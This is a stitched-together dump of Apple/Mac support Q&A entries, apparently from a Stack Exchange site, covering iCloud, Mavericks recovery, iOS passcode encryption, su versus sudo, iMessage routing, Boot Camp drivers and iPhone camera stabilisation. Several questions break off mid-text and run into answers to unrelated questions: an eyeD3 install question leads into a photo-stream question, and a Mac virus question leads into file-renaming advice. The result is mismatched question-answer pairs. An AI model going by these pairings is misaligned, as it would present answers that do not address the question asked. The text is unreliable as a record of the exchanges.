remains at app developer's discretion: many major apps still don't support Dynamic Type nor have built-in font size settings (Facebook, Skype, Things, all the Google apps I tried)\n\n*there's effectively no benchmarking or standard on similar UI elements between different apps: every app developer decides on his own what is large enough\n\n*with several exceptions, font size is nearly the same between different apps that support Dynamic Type / Larger Size system settings \n\n\n\nBottom line: both iPhone 6 and iPad Mini can solve the \"small font on iPhone 4\" problem, provided that you use apps supporting Dynamic Type. And for apps without Dynamic Type, the problem is generally still there--and app developers are to be addressed with this.\n\nSee also the list of iOS apps supporting Dynamic Type / having its own font size setings (and of those that do neither).\n", "Q: How do I view and pull off videos from my iCloud? A while back, when I moved to a new town and didn't have my hard drive with me, I was running out of room on my Mac (I collect a lot of movies and television series), so I moved a television series that I didn't watch all that often into my iCloud (or so I thought).  I deleted it from my Macbook library, but only because iTunes gave me the impression (via warning alerts) that despite me deleting them, they would still be stored in iCloud.  Three months later, after cleaning out my Mac, I want to watch the stored series again, but now I have no idea how to access my iCloud storage or how to pull files out of it.

Can't install Mavericks I've formatted my Macbook, and attempting to reinstall Mavericks, but I have a problem.\nI access my Internet via an access point that requires me to log in via the web interface. When the formatted finished, I opened Safari to log in, but it froze. I was forced to reboot.\nNow when I reboot and hold 'CMD + R' it automatically ties to connect to Apple, but of course it won't until I log into the web interface. So it fails.\nHow can I get around this? I have no other computers, apart from my tablet, I have no access to the router to plug in the LAN (not that it would matter because the MBP has no ethernet port). I have no CD/DVD drive, and the Macbook doesn't have one either.\nAny advice\n\nA: Did you format your whole drive, or just the Data Partition (usually called Macintosh HD)\nIf you formatted your whole drive, holding down Command+R will take you to Internet Recovery (if your Mac has either had the EFI Firmware Upgrade for Internet Recovery or it's pre-installed on a relatively new Mac), or else do nothing, and flash a ? mark, indicating that there is no bootable partition on any available drives.\nInternet Recovery doesn't work on captive-networks, as you've discovered.\nI suggest you take your Mac to an Apple Store, use the Free Wi-Fi to connect to Internet Recovery (if possible), and download your OS from there. \nIf Internet Recovery is not a possibility, then I suggest you make an appointment with an Apple Genius, and he/she should be able to guide you through the steps necessary to re-install OS X Mavericks.\n\nA: I have a sneaking suspicion that your installer is stuck in a bad boot cycle. You can try resetting your PRAM, which might shake it out of its fixation on connecting to Apple and enable you to boot to the recovery partition again.\nTo reset your, first completely power off the system. Turn the power back on and then immediately press all four of command+option+p+r and continue holding this key combination until you hear the startup tone a second time. After that you should be able to do your usual startup with command+r to get into a fresh recovery mode.\nI've seen it written on various threads in the Apple discussion board that Internet Recovery doesn't jibe well with WPA connections, preferring to operate over WPA2. That seems odd to me, but I present it to you so you can try to use WPA2 to connect (if possible). If not, perhaps WEP is available.\nWhen you're successful in getting Mavericks installed again and all is back to normal, I'd recommend purchasing an 8GB USB stick and using DiskMaker X to create a bootable installation image. Mavericks is a free download for you from your App Store purchases page. DiskMaker X can dig into the Mavericks installer that you download from Apple and create a bootable USB image that is far, far faster to install from than going over an internet connection.\nDiskMaker X can be downloaded for free from:\nhttp://liondiskmaker.com\n", "Q: Can I identify all iTunes purchases bought with a particular ID Account?

This will look for references to that name in all of the downloaded files in your iTunes directory. I don't buy a lot of music through the ITMS but this seems to identify the ones that I purchased through a specific account.\nThere is also this Track Down Purchases application. I have not tried it, but it looks like it would also do what you want.\n\nA: I can't think of any way of identifying purchases at the local system level. The only manner of which I'm aware is to log into an iTunes account at the Store and examine the purchases made from within the account. At that point, it's a matter of divide and conquer.\n", "Q: Macbook 10.9.5 Firefox freeze After updating OS X on my Macbook 2011 to 10.9.5 I've started facing Firefox (32.0.3) freezing for a minute when macbook is resumed from suspend.

This means even if someone stole your phone, took the storage unit out of the phone and mount it he will NOT be able to to examine your data as it encrypted. Something similar to what *nix OSes do when you choose to encrypt your home folder during the installation process.\nMy concerns are:\n\n\n*\n\n*What type of data does it encrypt? it's hard to believe that my iPhone decrypts all my photos once I enter my passcode (assuming that iOS encrypted them)\n\n*How difficult is it to crack an encryption that is based on simple four digits?!\n\n\nA: Yes, your iOS passcode will encrypt your phone's data.\n\nData protection enhances the built-in hardware encryption by protecting the hardware encryption keys with your passcode.\n\nSource: iOS: Understanding data protection\nWhilst it was generally unclear exactly what was encrypted in older versions of iOS, Apple have made it clear in their new privacy policy with regard to iOS 8:\n\nOn devices running iOS 8, your personal data such as photos, messages (including attachments), email, contacts, call history, iTunes content, notes, and reminders is placed under the protection of your passcode.\n\nSource: https://www.apple.com/uk/privacy/government-information-requests/\n\nA: In regard to your question about how hard it would be to crack, it would need to try a maximum of 10,000 passcodes to get it right, so (I think) it isn't that secure if the hard drive is removed and could be decrypted. If you are worried about security, you can set a passcode with letters - you need to turn off Simple Passcode.\n\nA: Addressing: \"How difficult is it to crack an encryption that is based on simple four digits?!\"\nThis is a deeper question than you might expect. And much of the following is over-simplified to save time and explaining background concepts. If you are talking about ios8 the answer is different than if you were talking about ios7 or earlier.\nIn iOS7 and earlier the phone could be imaged, and decryption of the image could be attempted on a desktop system with all 10,000 possible 4 digit pins more or less instantaneously. Also Apple maintained a separate key they could use to decrypt the device if served a warrant.\nIn iOS8 decryption must be performed on device as it uses a devise specific number (that cannot be extracted from the device) in addition to your pin for encryption; this also prevents Apple from decrypting the device under warrant so you are protected from various three letter organizations serving baseless warrants as Apple has no more advantage in decrypting your device over anyone else. This requirement to perform decryption on-device significantly slows the rate of attempts. If you have \"erase data after 10 failed attempts\" enabled, then this further slows the process as an attacker would have to image the phone, attempt 10 pins on device (with exponential backoff) and after that run of 10, restore the device with your image.\nI'm not familiar with the software that exists to perform these tasks, so I can't estimate how long it would take to try all 10,000 pins under these circumstances; however it is worthwhile to note that the director of the FBI and the US attorney general are throwing tantrums because of it, so presumably it is enough to make their lives more difficult.\n\nA: It all depends on the algorithms being used. AES is a very fast algorithm, but it also depends on the mode of operation. Assume that Apple used AES or 3DES because they are standardized. Now, computation of the plaintext is only possible (at the moment) with an exhaustive search attack. But the attacker can manipulate the plaintext. But that would not do much good in a counter-terrorism operation. Never corrupt the data if it is important. If the attacker was spying using software such as VNC, (if such software exists for iOS), or an advanced touch Keylogger, unless he had access by ssh, he would probably not have been able to install the Keylogger, unless he had previous info on the UI decryption key (not for hardware decryption). If he gets an image of the device, he can perform an online attack on the UI encryption, but he can't change the code, without data corruption. This means he will be locked out after several failed attempts. If the attacker manages to get a hold of the disk, he can perform an offline attack. But this is much harder, as hardware encryption is on. The attacker will eventually win, but will it do any good?\n", "Q: How to install eyeD3 on OSX?

I need to get rid of the contents of a shared photo stream on my device but I am its owner. The subscribers will still need it. I would like to keep the comments, photos and the public page alive but simply give the ownership over to someone else. A simple thing but I cannot seem to figure out how to do that on iOS.\nIf I erase everything on my iPad Mini in order to sell it will the Shared Photostream also get destroyed? I'm trying to avoid that and hand it over to someone else. Also, should I use the same Apple ID on another device, if I would not want that stream to reappear.\n\nA: Do not worry about wiping your device to sell it. Shared Photostream is entirely in iCloud and tied to your Apple ID. Wiping your device does not change the status of anything in the cloud. I have wiped devices at various times and signed into various devices - always to have the correct Shared Photostreams appear - ones that others have shared with me and ones I have created myself. \nAside from that, your question is complicated. I am sure that there is no way to transfer ownership of the iCloud Photostream. Your subscribers will have to either save all the pictures to their devices or one could select all of them and create a new Shared Photostream. However, all of your comments and likes will be lost during that transition. \nRegarding your Apple ID, I certainly recommend you do not change Apple ID. However, if you do not have any iTunes, App Store, or iBook Store, and don't mind changing it, I suppose it would be an option. However, I believe there are better ways. I have observed others dealing with multiple Apple IDs and it can be a terrible frustration. \nSo again, wiping your device is certainly not a big deal, and don't change Apple IDs. Sign back in with your same Apple ID on your new iOS device (if iCloud backup was on) and all your pictures, settings, apps, and documents should automatically come back. \n", "Q: Access to sudo but not security and privacy or users and groups How can I add myself to these groups so that I can have access to these areas in system preferences? I have sudo access but I'm not sure how to accomplish this through terminal.\n\nA: Try running the below command in terminal. It will add your user to the admin group which should have access to all of system preferences. You might have to restart to make the changes take affect. Be sure and replace yourUserName with the username you want to have admin rights.\nsudo dscl . append /Groups/admin GroupMembership yourUserName\n", "Q: iPhone 5s. If you are connected to wifi at home and the wifi temporarily loses signal does the iPhone automatically switch back to cellular network? I want to know if you are connected to your home wifi, and that wifi temporarily loses signal for a few hours, does the iPhone automatically start using your cellular network?  \nI had an issue with my Find Friends App not showing my location for a while, even though I never shut it off.  I am just wondering if this could be the cause. \n\nA: This has changed since iOS 9 with Wi-Fi Assist\n\nWith Wi-Fi Assist, you can stay connected to the Internet even if you have a poor Wi-Fi connection. For example, if you're using Safari with a poor Wi-Fi connection and a webpage doesn't load, Wi-Fi Assist will activate and automatically switch to cellular so that the webpage continues to load. You can use Wi-Fi Assist with most apps like Safari, Apple Music, Mail, Maps, and more. \n\n\nPrior to iOS 9…\nNo, unfortunately not. \nIf the WiFi signal itself is still 'live' the iPhone doesn't check to see if it's actually connected to the outside world, unfortunately. It will just spin its wheels waiting for data that never arrives.  \nYou need to switch it over manually.\n", "Q: OS X unwanted shortcut: ⌘⌘ converted to ⌘C As the title says, whenever I repeat the ⌘ key it triggers a copy command (just as if I pressed ⌘C). I can even see the \"Edit\" menu entry blinking when I do that. This happens system-wide.\nI checked OS X's shortcuts under System Preferences > Keyboard > Shortcuts, but there's nothing there. I also checked other apps, like BetterTouchTool, but it's not defined in any of them.\nThis started happening a couple of months ago and I'm going a bit crazy with this. Is there any way I can know which app is creating / assigning each shortcut? That could massively help narrowing it down.\nThank you!\n\nA: You may get some luck if you download and install CheatSheet - it builds a list of shortcuts for the current application, so you may be able to track it down by working through your apps with that.\n", "Q: Can't access iCloud account I have forgotten my iCloud password. It has also an old email address I can't change. It is not the same as my Apple ID and password. Now I can't get into my iCloud.\nMy iCloud is updating for 3 days already and nothing is happening.\nNow, how can I access my iCloud account when I can't change my password there or change my email addresses?\n\nA: Call Apple\nWhen all the 'normal' (http://support.apple.com/kb/HT5787) verifications do not work, how can the iCloud be certain it is you?\nYou can call/contact Apple (http://support.apple.com/kb/HT5699). They will try to validate your account by multiple other ways. (billing information, creditcard info, etc). And one of the things they will probably ask for is some email conversations with other persons. So you might need to contact some friends/family/colleagues to dig in there archive for email conversations with your iCloud account.\nYou might expect your Apple contact to be suspicious, as they have recently had troubles with 'hacked' (wiki link) iCloud accounts.\nMight this be a good lesson to always have a valid backup email address and a working 2-step verification☝️.\n\nA: Connect the device to iTunes go to - summary - restore iPad and it should work\n", "Q: Cable to record from iPhone to Mac I want to play audio from an iPhone and record it on a Mac or PC. Can a simple male to male stereo cable be used as headphones to the iPhone and a recording device to a PC or Mac?\n\nA: Yes, there's nothing why it shouldn't work.\nPlease not that some Macs only have one headphone Jack. Even if it automatically switches to in&output when you plug in an (Apple) Headset, you'll have to set it manually to input when using a normal male-male cable.\nTo do this, open Settings>Audio and you'll find a dropdown box. ('use headphone jack as...' or so)\n\nA: Yes, but before connecting it together.\n\n*\n\n*Set the iPhone Volume to be about 80%.\n\nThis is a approximation of the audio line input levels that the Mac audio jack (when in input mode will expect), don't go higher as this possible might damage the port, or distort.  Much lower that 80% may mean more noise on the recording.\nThen\n\n\n*Use shortcut to use Audio Port for Input\n\nHold Option (aka Alt) and then click on the audio icon on the system bar menu tool bar.  Under \"Use Audio Port For:\" Click on Input, see image:\n\nThis is much faster when switching back and forwards, please note if you use the single jack for headphones too the next time you plug them in, the sound will still be going out the internal speakers until you change the port over to Output\n", "Q: Restore MacBook after Avast! install (stuck at apple logo) Somebody installed Avast! on this MacBook running OSX 10.8 (that's what uname said) and now it won't boot, it gets stuck at the apple logo and nothing more, I was able to boot into single-user mode and made a backup.

I recently bought a LG monitor 22MP55, to use at home as a second monitor with my MacBook Pro.\nBut the color is a little weird! Slightly yellowish.\nI tried using it with a Windows 7 PC with the same website, and the colors displayed with the PC windows were more accurate and better.\nWhy is the display color better with a Windows PC? How can I get a better colour profile on my MacBook Pro?\n\nA: What you want to do is adjust the color profile on your Macbook Pro to take advantage of the LG 22MP55. So you would go to System Preferences -> Displays and then choose Color and play around with the selected Display profile: to find one that suits your needs best.\nOr you can take it a step further by calibrating your own profile. Which can be tricky, but does work if you spend the time and effort.  In that same preference area choose Calibrate… to begin the process of adjusting your screen settings to best suit your needs.\nBut past any of that, you might find it worth it to invest in a calibration device such as a Spyder calibrator. I use the Spyder3EXPRESS and it works great. The newest version is the Spyder4EXPRESS which should be just as good if not better. It costs anywhere from $60 to $99 and is well worth the investment. The color on your display will be perfectly calibrated with little hassle or headache.\n\nA: There is a application on your Mac that allows displays color management.\nIt is in your Utility folder called ColorSync Utility.\nOpen it and look what profile is used currently, and what is he factory recommended profile.\nHere you can choose different color profiles or modify the existing ones to one that suits you.\n\nA: If your monitor's reader profile is on, please switch that off. It will make a difference.\n", "Q: Late model MacBook Air 13 I’m very new to OS X.  Just bought my first Apple – Macbook 13.

If running quick diagnostics doesn't turn up anything, I'd run a full suite of comprehensive tests overnight. If the box reports hardware errors or kernel panics during testing, it should be taken to a Genius Bar or an authorized Apple repair centre for further tests and repair.\n", "Q: Menu bar icon disappear \nA few days ago, when I start my OS X, I see that a few key icons are gone: including the clock, WIFI, battery and various other things. \nI did the following:\n\n\n*\n\n*Remove the file ~/Library/Preferences/com.apple.systemuiserver.plist\n\n*run killall SystemUIServer in the terminal.\n\n\nThe icons did come back. However after restart the icons are gone again.\n\nOther symptoms include: whenever I connect to my WIFI, and then open any application, they will get shutdown immediately, giving error messages like: \n\nPlease run the gather_files.sh command that's attached to the radar\n  sudo gather_files.sh\n\nThese disappears after a day, but the icons are still gone. How can I get those icons back?\nI am using OS X Mavericks 10.9.2\n\nA: This worked for me:\n\n\n*\n\n*Reboot and hold shift key to enter safe mode\n\n*Launch Safari\n\n*Reboot normally\n\n", "Q: difference b/w various commands for getting root access in terminal I have used linux:Kali for a while and to get root access i just needed to type: su in terminal. But in OSX i need to type in su - what does this - mean? \nIf i just type su in terminal than i get sh-3.2# in next line \nwhereas if i type su - then i get root# in next line.\nWhat's the difference between all of these commands. \nAlso i see some other commands to get root access in terminal: \n(1) su bash\n(2) sudo su\nPlease help to understand difference b/w all these commands. \n\nA: From man su:\n-l      Simulate a full login.  The environment is discarded except for\n        HOME, SHELL, PATH, TERM, and USER.  HOME and SHELL are modified\n        as above.  USER is set to the target login.  PATH is set to\n        ``/bin:/usr/bin''.  TERM is imported from your current environ-\n        ment.  The invoked shell is the target login's, and su will\n        change directory to the target login's home directory.\n\n-       (no letter) The same as -l.\n\nAs for su versus sudo, it's generally accepted in Apple circles that sudo is the preferred method of working in root. By default, su is disabled on OS X (as is the root account). There are only a few occasions when I've had to enable root to get things done.\nFor more information, I recommend reading both manpages.\nman su\nman sudo\n\nA: You forgot my favorite way to root:\nsudo -s\n\nThat says to make a new root shell and gets all the modern and advanced sudo goodness like more fine grained access to grant or deny root in specific cases and also sets up a proper root shell, no matter if you use bash or another shell. \nAlso, sudo asks for your password, not the other user’s password and in the case of root, Apple doesn’t make a root password by default. This lets you get root without futzing in the majority of macOS systems you will use. \n", "Q: iMessage sent to one phone is going to another phone instead My brother in laws daughter is intercepting all his iMessages on her iPhone. Someone sends him an iMessage and instead of going to his phone, it goes to hers???? This started right after she updated his phone and used her info and wifi. Plain texts still go to him\n\nA: Do they, somehow, use the same Apple ID? If so, the phone number has paired to the Apple ID, and every iMessage will notify the most active device (that is, the daughter in this case) before pinging the others.\nAs some would say, it's not a bug. It's a feature. I have a few solutions for your brother in law:\nIf the Apple ID belongs to the daughter\nYou said:\n\nshe updated his phone and used her info\n\nIf the father has the daughter's Apple ID logged in on his iPhone, just go to Settings :: Messages :: Receive at on the father's iPhone and log in with the right Apple ID. \nIf the Apple ID is the father's one\nIf both the daughter and the father are logged in to the father's Apple ID, you have the following options:\nGet the daughter a personal iCloud account\nAs the daughter already has an iPhone, I suggest your brother in law creates an account for her. If they use a version older than iOS 8, they can go to Settings :: Messages and create an Apple ID from there that will just be used for iMessage and FaceTime. She will still be able to download apps from your brother in law account. Otherwise, if they use iOS 8, they can create a new child account that will be used for all services, including the App Store, but use the same credit card (the daughter will have to send requests to buy)\nDisable the feature\nIf they have to keep the same iTunes account, you can go to Settings :: Messages :: Receive at on the daughter's iPhone, and uncheck your brother-in-law phone number. This way, she won't receive his iMessages anymore.\n", "Q: iPhone asking for Apple ID for a former roommate At some point several years ago a former roommate used my phone or iTunes for something. I can't recall for what, but since then each time I get a new phone, or need to restore from a backup, I'm prompted to login with her Apple ID. In the past I would just cancel out of the login prompt a couple of times and then it wouldn't happen anymore (at least until the next time I needed a restore).\nI just got the iPhone 6 and have been trying to get everything setup, but this time canceling out doesn't appear to be doing the trick. It keeps prompting me for it and will not finish the initial iCloud restore until I've logged in as her. I have no idea what app(s) or music on my phone would be attached to her account, but I would gladly delete them.\nIs there a way to unassociate her account with my phone, or at the very least determine which apps are apparently tied to her account so I can remove them?\nEDIT (11/23/2014)\nThe solution marked below should work. What ended up happening with my issue was that I kept declining the prompt and after several hours it finally offered to finish the sync and said that anything I hadn't logged in for would be permanently removed. I said that was ok and it finished the restore.\n\nA: I suppose you restored your iPhone 6 from a backup of your older phone. If I understand the issue well enough, the phone keeps asking you for your friend password because you have an app that is his. If this app is on your computer in iTunes, there is a solution.\nIn the iTunes' list view of your Apps, right-click on an app, \"Get info\" (or just press cmd ⌘+I), and, depending on your OS version, either go to the Summary or the File tab. The Apple ID of the buyer, as well as his name, will appear, and you just have to go through your files (pressing cmd ⌘+P and cmd ⌘+N) until you find the culprit. \nUnfortunately, iTunes cannot sort apps by buyer. However, you could sort Apps by \"Date Added\" in the list view to make the whole process much easier. \n\nA: If it's an app and you wanna find it quickly just go to updates on your phone, click 'update all' then when the phone asks for the other ID you cancel it.\nThe apps that will stay on the updating list after finishing the update process are the ones on the other ID.\n(I know it coz I have some apps that jumped onto my phone at some point and now I'm totally gonna try changing the ID on them. Thanks, Lax!)\n", "Q: Bootcamp Macbook Air thinks my USB 3.0 ports are USB 2.0 I recently installed Windows 7 via bootcamp on my new Macbook Air. I have a Seagate USB 3.0 drive that works great in OSX but behaves strangely in Windows. Windows recognizes that it is a USB 3.0 drive, but tells me that it's connected to a USB 2.0 port. This is especially weird since I definitely have the Intel USB 3.0 eXtensible Host Controller installed. I used USB Device Tree Viewer and determined conclusively that Windows is operating my drive at USB 2.0 speeds. What can I do to get my speed back?\n\nA: On Windows, you need drivers in order to have everything working fine. In this case, the bootcamp should install it for you right after Windows installation. It installs all drivers: trackpad, graphic card, webcam, USB 3.0; as well as some bootcamp utilities that allow you to use the F10, F11, F12 as volume keys for instance.\nIf you didn't get this part during your installation, you just need to use the USB-stick you installed windows with and run the bootcamp software on it (it's the only .exe you'll find). \nOR\nSee this Apple Support page to download it again (64-bit, Mid-2013 MacBook Air): http://support.apple.com/kb/DL1721\n", "Q: Restore Send icon in Apple Mail I have lost the \"send\" icon on my Apple mail, top right corner\nHow do I restore it? \n\nA: Start a new message  Command ⌘ / n   , then with that message front-most [this gives different choices than if the main window is at the front]  \nView menu > Customise Toolbar...\nDrag the default set at the bottom into the toolbar, or just drag the Send icon back to where you'd like it.\n", "Q: MacBook Pro kernel panic at boot My MacBook Pro kernel-panicked with this message, \"You need to restart your computer. Hold down the power button until it turns off, then press the power button again.\"\nThe same message appears each time I reboot.\n\nA: This sounds as though your system is in a cycle of kernel panics. The first thing to do is to try starting your system in Safe Mode to clear out the system- and application caches and to rebuild the font libraries:\nhttp://support.apple.com/kb/ht1455\nIf that doesn't do it, I would next try resetting your PRAM. There may be some boot settings that have gotten messed up. To reset your PRAM, turn off your computer and then turn it on again. Immediately press command+option+p+r until you hear the start tone for a second time, then release it.\nIf a Safe Boot and PRAM reset don't fix things, you can next try resetting the System Management Controller (SMC). Instructions vary depending on the system, so see the following Apple article for details:\nhttp://support.apple.com/kb/HT3964\nFinally, if that doesn't do it, you'll need to run Apple Diagnostics to determine whether you have a hardware fault. Again, details differ depending on the system, so see the following article:\nhttp://support.apple.com/kb/HT5781\nBest of luck!\n\nA: Hold down command + r to boot into Recovery Mode, then re-install OS X.\n\nA: Shutdown your Mac. As soon as you hear the start up tone hold down shift. Then you must release shift key as soon as you see the gray Apple picture. This will lead you to safe mode. Then you restart your Mac to leave safe mode.\n", "Q: MBP major virus I think I am sure I have got some virus(s) in my Mac book & I have no idea what to do about it.

There are free options out there, but Name Mangler offers a ton of features that make it well worth the $19.00 to me.\nHere is Name Mangler on MacUpdate which includes links to many similar programs.\n\n\n*\n\n*Once you have Name Mangler installed, launch it\n\n*Drag all of the folder you want to rename into the panel where it says \"Drag Files and Folders Here\"\n\n*On the right choose \"Find and Replace\"\n\n*Enter \"<\"\n\n*Under \"Replace with\" enter the character you want to replace \"<\" with or leave blank to remove it\n\n*Click \"Rename x of x items\"\n\n\nOnce of the many things that makes using a tool like Name Mangler valuable is that you can undo your changes, view a history of your changes, and create a \"droplet\" that make running the name change on other files really convenient. All of that plus being able to use Regex to build very complicated renames.\nThere is also a great Name Mangler Google Group where you can get your questions answered and some very advanced features and methods get discussed.

If you were trying to replace a different character such as colon : you would not need the \\ in front of it.

It depends on the file system and for instance also on where the Dropbox folder is mounted in Windows (since the complete path name in windows is not allowed to exceed a certain number of characters). And since OSX doesn't know where you will mount Dropbox under windows, it can't guarantee that a particular file will work.\nNow, there is an easier question on whether we can find all files containing a character that is illegal in windows filenames, namely <>:\"/\\|?* (according to the same document). This is quite easy using the commandline:\nfind . -name '*[<>:\"/\\\\|?*]*'\nRun this in the Dropbox directory (or replace the . with the Dropbox directory), and it should give you a list. The rationale is that in a filename [] is being used to mean: one of these characters. So I'm asking to list any file under this directory that contains one of these characters. Within the brackets, I only need to escape the backslash.\n(now note that this command will also theoretically catch many filenames that are not valid on OSX, so can never be there in the first place, but that doesn't matter).\n", "Q: Macbook 5.2 screen goes dark Can I use and external monitor even though my Macbook 5.2 screen goes dark even though I can still see images when a flashlight. The entire system works and I did bring it to Mac in Portland, Maine and the entire display would have to be replaced for $500. So can I use and external if the screen goes dark. I would like to keep this running for another year.\n\nA: You can use an external display, using a mini-DVI to 'whatever your monitor needs' connector... More info from https://discussions.apple.com/thread/4195107 \n\nThe model 5,2 has a Mini-DVI port not a Mini DisplayPort. Depends on what input plug you'll be using on your TV. VGA, DVI, Composite or HDMI. You'll need a Mini-DVI adapter and a cable from that to your TV. Here's the various types of Mini-DVI adapters on Amazon.com http://www.amazon.com/s/ref=nb_sb_noss?url=search-alias%3Daps&field-keywords=mini-dvi&x=9&y=13\n  (Composite is the red, white and yellow RCA plugs on your TV or red, white and S-Video plugs.)\nYou'll also need audio cables to the TV using a 3.5mm stereo headphone jack to RCA sound plugs or a 3.5mm stereo input plug for audio. You attach it from the headphone jack of your MacBook to the appropriate audio input plugs on your TV.\nIf you connect the MacBook using a Mini-DVI to HDMI adapter you will probably need to use external speakers or a 3.5mm stereo headphone jack to RCA sound plugs connected to a stereo system for audio if your TV doesn't have separate RCA input plugs or a 3.5mm stereo input plug for audio with the HDMI plug. The Mini-DVI to HDMI doesn't carry audio and there're no audio plugs on most TVs to work with HDMI since it's expecting audio with the HDMI. Check your TV manual though to see if it might have audio plugs that work with one of the HDMI ports.\n\n", "Q: How do I turn off email alerts for find my iPhone I would like to stop receiving alerts every time I sign into find my iPhone.

These are the factors that led me to my suspicion:\n\n\n*\n\n*While recording a video, if I shake the phone lightly, the shakiness is visible in the preview. However, when I play the after recording, most of the shakiness is gone.\nThis makes it look like stabilization is only being applied only once the video is done recording: Optical Image Stabilization (at least the way Apple describes it) is supposed to move the physical sensor to compensate for movement, so I believe that the preview shown while recording should also be stabilized.\n\n*Based on the previous assumption that the physical sensor should move, I think that said movement should be apparent by observing the rear-facing camera while the camera app is open and the phone is being shaken lightly. Unless the actual moving parts are not directly visible, I don't think they're moving in my phone. Besides this, the inner part of the camera (the lens you can see right behind the outer glass and the black plastic around it) looks like it's slightly offset downwards, because I can see a small gap right above it, between the plastic and the frame of the camera. The same gap is not visible below the plastic, so it looks like it isn't centered. I have never seen the camera move from that position.\n\n\nIs there a way to be sure that Optical Image Stabilization is actually working? Do the things I described only happen on my device?\n\nA: The optical image stabilization on the iPhone 6 Plus has to do with a tiny motor changing the lenses while the sensor is fixed to the body of the phone.\nIt only engages for still photos and due to the size of the motors and limited space inside the device, it will be almost impossible to hear the sound of it in operation.\nThe real test will be if your phone isn't capturing sharp still images that are well lit and have some contrast lines for the focus pixels to establish what the proper focus should be. I suppose you would need to mount an iPhone 6 and 6 Plus on the same physical mount and take the same picture (burst mode) or using something to trigger both shutters at the same time.\nAlso, you might try taking pictures from a moving car out the side window and see if you can detect any difference in the EXIF metadata between pictures taken while moving versus pictures taken when still. Apple encodes all sorts of details and I would start by looking at the Focus Mode field to see if OIS is indicated there.\n\nThat said, optical image stabilization on professional canon and nikon lenses costing $4000 and up isn't magic and just gets you one or two stops of exposure for a given shutter speed. The effects are not huge so you are gaining a slight boost in the amount of light that can be gathered and the shutter is allowed to stay \"open\" for longer than if the OIS were not helping to keep the image centered on the CCD.\n\nA: I am 100% certain that the iPhone 6 plus does not have OIS for video, just for photos. It states in Apple's keynote and on their website that this capabilities for photos and not for video. Apple uses Cinematic Video Stabilization which is software for stabilizing video. But this is what really ticks me off. Every single review on the Internet and every single video review on youtube say that the OIS on the 6 plus helps tremendously for video and a lot of them do not even mention how OIS is used for photos. I do not know if other phones with OIS use it for video, especially for 4k video since you can not use software stabilization when recording 4k. I just do not understand how everyone could be mistaken. When OIS  does kick in for photos, there is no difference at all in good light and in low light there is no difference that I can see but some do say they can see slightly less grain. Can someone just please tell me how every person has gotten this mistake wrong.\n\nA: According to https://www.apple.com/iphone/compare/ the 6s Plus uses OIS for video.\n", "Q: Can I use a t-mobile contract free iphone 6 in europe with a sim card from a local provider? Or: How do I know if my country has a compatible network? A friend of mine is going to NYC. I'd like him to buy a contract free t-mobile iphone 6 for me cause they are cheaper in the US. I would like to use this phone with my european sim card provider. Is that possible?\nWhen I've googled this I've seen some contradictory information on forums (can't post more than two links here cause I'm new) and in various websites. An apple customer rep told me: \"As long as your preferred wireless provider is compatible with the T-Mobile GSM network, then it will work.\" What does compatible mean here? Is it a matter of frequencies and stuff that is fairly standardised? If I'd be able to connect to the local carriers network (ie. roam) with a t-mobile sim while travelling does that mean the network is compatible?\nIt seems like you might be able to discover if you're phone is useable in other countries for sure by looking at the per country coverage lists you'll find if you google \"International Plans Calling Abroad Traveling T-Mobile\".\nThe question \"When I buy an iPhone 6 from the Apple website and select contract-free from T-Mobile, is the phone carrier unlocked?\" that's already available on this page might be seen as an answer to this question. However clarifying what \"compatible carriers\" mean and wether information on where roaming is possible answers the question \"are there compatible carriers in my country?\" might be nice for other users, at least it'd be nice for me.\nhttp://store.apple.com/us/question/answers/iphone/is-iphone-6-for-tmobile-unlocked/QU2A7TAHD7HYCJPD9\nhttp://hothardware.com/News/Want-An-Unlocked-iPhone-6-Pick-Up-The-TMobile-Version-ContractFree/\nEDIT:\nFor LTE coverage info, I think you can compare supported LTE bands on the different models of iphones with LTE bands on networks in your country: \nhttp://en.wikipedia.org/wiki/IPhone_6 (see LTE bands)\nhttp://en.wikipedia.org/wiki/List_of_LTE_networks (look for your country)\n\nA: The phone will work (all the typical phone functions) without any problems. From what I've heard, it is only unlocked if you buy the T-Mobile version directly from the Apple store (not from a T-Mobile store). \nAs mentioned above, the LTE functionality is the question. Apple's website details the T-Mobile version's included LTE bands (model A1549 (GSM)).\nYou can check those bands versus what bands your carrier uses to determine if it will give you the full LTE functionality. Wikipedia has an extensive LTE band list per country.\n\nA: Compatible carrier ?\nIn USA and \"only\" in USA there are 2 types called the GSM and the CDMA.\nThe rest of the world (~ 95% of it) is on GSM type networks.\nT-Mobile is on the GSM in the USA and also on the GSM in Europe.\nIn Europe the GSM is set as standard by the EU policies, so any provider you pick will work.\n", "Q: Java is eating up 300% of my CPU Can anyone help me find the cause behind java taking up 300+% of my CPU?

Has anyone else seen/fixed this?\n\nA: As Buscar noted above, I got an answer to my problem from a very helpful person on the Apple discussion board. You can see the discussion here.\nSomehow, this problem is related to permissions, and ACLs. The answer involved checking permissions from the command-line to see if there was a problem, and then resetting the permissions using either the command line, or using the Recovery partition on your Mac.\nUse the following command to see if permissions/ACLs are incorrect:\nfind ~ $TMPDIR.. \\( -flags +sappnd,schg,uappnd,uchg -o ! -user $UID -o ! -perm -600 \\) 2>&- | wc -l\n\nIf you get a number other than 0 back, then there might be a problem.

This question is applicable to both iPads and iPhones: how do I extend the lock screen timeout? By that I mean the time from when I see the \"slide to unlock\" message to when the screen goes black again. Right now when I press a button to wake my device up, I have about four or five seconds to slide the screen to unlock, before it just goes dark again. I would like to extend this timeout if possible. How do I do it?\n\nA: Without jailbreaking your iPhone there Is no option to change that. \n\nA: Everything you need to know (I think) : First, the OP is about whether it’s possible to extend the amount of time the lock screen stays lit, not how long it takes before the unlocked device’s lock screen kicks in. \nIn doing some experimentation with an IPhone 6 and IPad Pro (2nd gen) both using iOS 12.4, Apple has set 2 timers for the lock screen and 1 timer for the widget screen (accessed by swiping to the right). None of the timers are adjustable in Settings\nWithout a notification present, the main lock screen will remain lit for 5 seconds before going black. With a notification present, the lock screen remains lit for 10 seconds before going black. \nThe Widget screen will stay lit for 10 seconds before dimming and then 5 seconds later will go black.\nThings you CAN’T do to keep the lock screen lit:\n\n\n*\n\n*use the sleep/lock button. This does nothing but turn off the lock screen prematurely. Once the lock screen goes black, pressing it again will bring back the lock screen and reset the 5 or 10 second timer. As suggested in other posts, there doesn’t appear to be any tricks to use the sleep/lock button to increase the length of the timer.\n\n*Pressing the Home button. Pressing it brings up the login screen. Once the lock screen goes black, pressing it will bring back the lock screen and reset the 5 or 10 second timer.\nThings you CAN do to keep the lock screen lit:\n\n\n*\n\n*pressing one of the volume buttons (up or down) every 3-4 seconds will reset the timer and keep the login 